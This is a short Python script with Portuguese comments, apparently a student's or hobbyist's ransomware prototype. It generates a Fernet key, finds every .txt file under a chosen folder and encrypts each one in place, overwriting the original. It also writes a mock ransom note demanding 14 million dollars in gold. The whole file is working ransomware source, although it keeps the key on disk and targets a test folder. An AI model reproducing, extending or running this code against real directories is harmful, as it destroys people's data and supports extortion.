from cryptography.fernet import Fernet
import os
 
# 1. Gerar uma chave de criptografia e salvar
def gerar_chave():
    chave = Fernet.generate_key()
    with open("chave.key", "wb") as chave_file:
        chave_file.write(chave)
 
# 2. Carregar a chave salva
def carregar_chave():
    return open("chave.key", "rb").read()
 
# 3. Criptografar um único arquivo
def criptografar_arquivo(arquivo, chave):
    try:
        f = Fernet(chave)
        with open(arquivo, "rb") as file:
            dados = file.read()
        dados_encriptados = f.encrypt(dados)
        with open(arquivo, "wb") as file:
            file.write(dados_encriptados)
        print(f"[OK] Arquivo criptografado: {arquivo}")
    except Exception as e:
        print(f"[ERRO] Falha ao criptografar {arquivo}: {e}")
 
# 4. Encontrar arquivos .txt na pasta especificada
def encontrar_txt(diretorio):
    lista = []
    for raiz, _, arquivos in os.walk(diretorio):
        for nome in arquivos:
            if nome.endswith(".txt"):
                lista.append(os.path.join(raiz, nome))
    return lista
#5. Mensagem de resgate
def criar_mensagem_resgate():
    with open("Leia isso aqui.txt", "w") as f:
        f.write("Rapaz, seus arquivos foram surrupiados\n")
        f.write("Envia 14 milhoes de dolares em barras de ouro na minha casa\n")
        f.write("Após isso, vamos pensar em enviar a chave para recuperar seus dados\n")
 
# 6. Execução principal
def main():
    criar_mensagem_resgate()
    diretorio = r"C:\Users\joaoa\OneDrive\Desktop\Malware\test_files"  # EDITAR CAMINHO
    if not os.path.exists(diretorio):
        print(f"[ERRO] Diretório não encontrado: {diretorio}")
        return
 
    gerar_chave()
    chave = carregar_chave()
 
    arquivos_txt = encontrar_txt(diretorio)
    if not arquivos_txt:
        print("[INFO] Nenhum arquivo .txt encontrado.")
        return
 
    for arquivo in arquivos_txt:
        criptografar_arquivo(arquivo, chave)
 
    print("Criptografia concluída com sucesso!")
 
 
if __name__ == "__main__":
    main()
